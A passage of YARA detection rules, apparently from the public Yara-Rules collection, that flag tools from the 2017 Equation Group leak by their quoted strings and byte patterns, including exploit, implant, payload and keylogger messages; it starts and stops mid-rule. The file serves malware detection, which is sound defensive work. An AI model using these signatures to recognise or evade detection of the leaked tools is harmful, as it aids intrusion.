Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Eternalromance\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Error: Exploit choice not supported for target OS!!\" fullword ascii\n        $x2 = \"Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed\" fullword ascii\n        $x3 = \"[-] Error: Backdoor not present on target\" fullword ascii\n        $x4 = \"***********    TARGET ARCHITECTURE IS X64    ************\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them) or 2 of them\n}\n\nrule EquationGroup_Toolset_Apr17_Gen4\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Gen4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] \\\"TargetPort\\\"      %hu\" fullword ascii\n        $x2 = \"---<<<  Complete  >>>---\" fullword ascii\n        $x3 = \"[+] \\\"NetworkTimeout\\\"  %hu\" fullword ascii\n        $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 150KB and (1 of ($x*) or 2 of them))\n}\n\nrule EquationGroup_Toolset_Apr17_Gen1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Restart with the new protocol, address, and port as target.\" fullword ascii\n        $x2 = \"TargetPort      : %s (%u)\" fullword ascii\n        $x3 = \"Error: strchr() could not find '@' in account name.\" fullword ascii\n        $x4 = \"TargetAcctPwd   : %s\" fullword ascii\n        $x5 = \"Creating CURL connection handle...\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Gen2\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[+] Setting password : (NULL)\" fullword ascii\n        $s2 = \"[-] TbBuffCpy() failed!\" fullword ascii\n        $s3 = \"[+] SMB negotiation\" fullword ascii\n        $s4 = \"12345678-1234-ABCD-EF00-0123456789AB\" fullword ascii\n        $s5 = \"Value must end with 0000 (2 NULLs)\" fullword ascii\n        $s6 = \"[*] Configuring Payload\" fullword ascii\n        $s7 = \"[*] Connecting to listener\" fullword ascii\n        $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 }\n        $op2 = { eb 59 8b 4c 24 10 68 1c 46 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and 1 of ($s*) and 1 of ($op*)) or 3 of them\n}\n\nrule EquationGroup_Toolset_Apr17_Gen3\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Gen3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)\" fullword ascii\n        $s2 = \"[-] Could not set \\\"CredentialType\\\"\" fullword ascii\n        $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 150KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_yak\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_yak\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"-xd = dump archive data & store in scancodes.txt\" fullword ascii\n        $x2 = \"-------- driver start token -------\" fullword wide\n        $x3 = \"-------- keystart token -------\" fullword wide\n        $x4 = \"-xta = same as -xt but show special chars & store in keys_all.txt\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 800KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_AdUser_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_AdUser_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n        $s2 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_RemoteExecute_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_RemoteExecute_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00\n               00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00\n               65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00\n               00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68\n               5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00\n               63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00\n               6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00\n               57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00\n               44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00\n               6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00\n               00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00\n               53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Banner_Implant9x\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Banner_Implant9x\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n        $op1 = { c9 c3 57 8d 85 2c eb ff ff }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_greatdoc_dll_config\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_greatdoc_dll_config\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"C:\\\\Projects\\\\GREATERDOCTOR\\\\trunk\\\\GREATERDOCTOR\" ascii\n        $x2 = \"src\\\\build\\\\Release\\\\dllConfig\\\\dllConfig.pdb\" ascii\n        $x3 = \"GREATERDOCTOR [ commandline args configuration ]\" fullword ascii\n        $x4 = \"-useage: <scanner> \\\"<cmdline args>\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_scanner\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_scanner\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"+daemon_version,system,processor,refid,clock\" fullword ascii\n        $x2 = \"Usage: %s typeofscan IP_address\" fullword ascii\n        $x3 = \"# scanning ip  %d.%d.%d.%d\" fullword ascii\n        $x4 = \"Welcome to the network scanning tool\" fullword ascii\n        $x5 = \"***** %s ***** (length %d)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 90KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 }\n        $op2 = { 44 24 33 6f c6 44 24 34 77 c6 }\n        $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_tacothief\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_tacothief\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"File too large!  Must be less than 655360 bytes.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_ntevt\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_ntevt\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"c:\\\\ntevt.pdb\" fullword ascii\n        $s1 = \"ARASPVU\" fullword ascii\n        $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }\n        $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }\n        $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and $x1 or 3 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Processes_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Processes_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Select * from Win32_Process\" fullword ascii\n        $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n        $s5 = \"%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_st_lp\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_st_lp\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Previous command: set injection processes (status=0x%x)\" fullword ascii\n        $x2 = \"Secondary injection process is <null> [no secondary process will be used]\" fullword ascii\n        $x3 = \"Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> \" fullword ascii\n        $x4 = \"E: Execute a Command on the Implant\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_FullThreadDump\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_FullThreadDump\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"FullThreadDump.class\" fullword ascii\n        $s2 = \"ThreadMonitor.class\" fullword ascii\n        $s3 = \"Deadlock$DeadlockThread.class\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x4b50 and filesize < 30KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_EpWrapper\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_EpWrapper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* Failed to get remote TCP socket address\" fullword wide\n        $x2 = \"* Failed to get 'LPStart' export\" fullword wide\n        $s5 = \"Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_2000\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DiBa_Target_2000\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"0M1U1Z1p1\" fullword ascii\n        $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }\n        $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }\n        $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DllLoad_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DllLoad_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"BzWKJD+\" fullword ascii\n        $op1 = { 44 24 6c 6c 88 5c 24 6d }\n        $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 }\n        $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_EXPA\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_EXPA\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* The target is IIS 6.0 but is not running content indexing servicess,\" fullword ascii\n        $x2 = \"--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL\" fullword ascii\n        $x3 = \"By default, the shellcode will attempt to immediately connect s$\" fullword ascii\n        $x4 = \"UNEXPECTED SHELLCODE CONFIGURATION ERRORs\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_RemoteExecute_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_RemoteExecute_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Win32_Process\" fullword ascii\n        $s2 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n        $op1 = { 83 7b 18 01 75 12 83 63 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DS_ParseLogs\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DS_ParseLogs\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* Size (%d) of remaining capture file is too small to contain a valid header\" fullword wide\n        $x2 = \"* Capture header not found at start of buffer\" fullword wide\n        $x3 = \"Usage: %ws <capture_file> <results_prefix>\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Oracle_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Oracle_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 }\n        $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 }\n        $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DmGz_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DmGz_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n        $s3 = \"6\\\"6<6C6H6M6Z6f6t6\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_SetResourceName\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SetResourceName\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Updates the name of the dll or executable in the resource file\" fullword ascii\n        $x2 = \"*NOTE: SetResourceName does not work with PeddleCheap versions\" fullword ascii\n        $x3 = \"2 = [appinit.dll] level4 dll\" fullword ascii\n        $x4 = \"1 = [spcss32.exe] level3 exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_drivers_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_drivers_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n        $s2 = \"hZwLoadDriver\" fullword ascii\n        $op1 = { b0 01 e8 58 04 00 00 c3 33 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 30KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Shares_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Shares_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Select * from Win32_Share\" fullword ascii\n        $s2 = \"slocalhost\" fullword wide\n        $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n        $s4 = \"\\\\\\\\%ls\\\\%ls\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DUMPEL\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DUMPEL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"dumpel -f file [-s \\\\\\\\server]\" fullword ascii\n        $x2 = \"records will not appear in the dumped log.\" fullword ascii\n        $x3 = \"obj\\\\i386\\\\Dumpel.exe\" fullword ascii\n        $s13 = \"DUMPEL Usage:    \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_ntfltmgr\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = 